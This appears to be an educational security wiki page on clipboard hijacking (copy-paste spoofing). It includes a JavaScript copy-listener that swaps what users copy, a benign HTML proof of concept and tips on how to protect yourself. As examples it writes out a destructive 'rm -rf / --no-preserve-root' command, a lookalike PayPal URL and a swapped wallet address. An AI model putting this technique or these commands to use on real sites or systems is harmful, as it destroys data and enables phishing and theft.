---
icon: paste
---

# Copy-Paste Spoofing

## Introduction

**"Clipboard Manipulation Attack"** or **"Copy-Paste Spoofing"**, where a website displays one thing visually, but when you copy it, something entirely different is placed in your clipboard.

#### **How It Works**

1. **Text Appears Normal on the Website** – The website shows a piece of text, such as a command, email, or URL.
2. **User Copies the Text** – The user highlights the visible text and copies it (Ctrl + C or right-click → Copy).
3. **Different Text is Pasted** – When the user pastes the copied content elsewhere (e.g., a terminal, browser, or document), a completely different text appears.

#### **Technical Explanation**

This happens due to **JavaScript event listeners**, which modify the clipboard content when you copy. Here’s an example of how this can be done:

```javascript
document.addEventListener("copy", function(event) {
    event.preventDefault();
    event.clipboardData.setData("text/plain", "malicious_command"); // Changes copied content
});
```

#### **Use Cases of This Attack**

* **Malicious Command Injection:**
  *   The site displays:

      ```
      sudo apt install safe-package
      ```
  *   But when pasted, it becomes:

      ```
      sudo rm -rf / --no-preserve-root
      ```

      (which would wipe a Linux system!)
* **Phishing Attack:**
  * The site shows: `https://paypal.com`
  * But copying and pasting gives: `https://paypaI.com` (with a capital "I" instead of "l").
* **Cryptocurrency Theft:**
  * The site displays: `bc1qyourwalletaddress`
  * But pastes: `bc1qattackerswallet`.

#### **How to Protect Yourself**

✅ **Paste First in a Plain Text Editor** – This removes hidden clipboard modifications.\
✅ **Use "Paste and Match Style"** – This pastes only raw text without formatting.\
✅ **Disable JavaScript on Untrusted Sites** – Prevents clipboard modifications.\
✅ **Use a Clipboard Manager** – Some clipboard tools track copied text history.



***

## Demo

#### **How It Works:**

* The text displayed on the webpage looks normal.
* But when you copy it, something entirely different is placed in your clipboard.

***

#### **📜 HTML + JavaScript Code PoC**

You can try this by saving it as an `.html` file and opening it in a browser.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clipboard Hijack PoC</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.addEventListener("copy", function(event) {
                event.preventDefault(); // Prevent normal copying
                event.clipboardData.setData("text/plain", "echo 'You have been hacked!'");
                alert("Clipboard content modified!");
            });
        });
    </script>
</head>
<body>
    <h2>Copy this text: <span id="copyText">sudo apt install safe-package</span></h2>
    <p>Try copying the text above and pasting it elsewhere. 😉</p>
</body>
</html>
```

***

#### **🛠 Steps to Try It Out**

1. Copy the code and save it as `clipboard_attack.html`.
2. Open it in a browser.
3. Highlight and **copy** the displayed text (which appears as `sudo apt install safe-package`).
4.  **Paste it somewhere else**—you’ll see that it actually pastes:

    ```
    echo 'You have been hacked!'
    ```
5. **An alert box will pop up** when you copy, warning that the clipboard was modified.



***

## Try the Code

* [https://onecompiler.com/html/4386f4c77](https://onecompiler.com/html/4386f4c77)



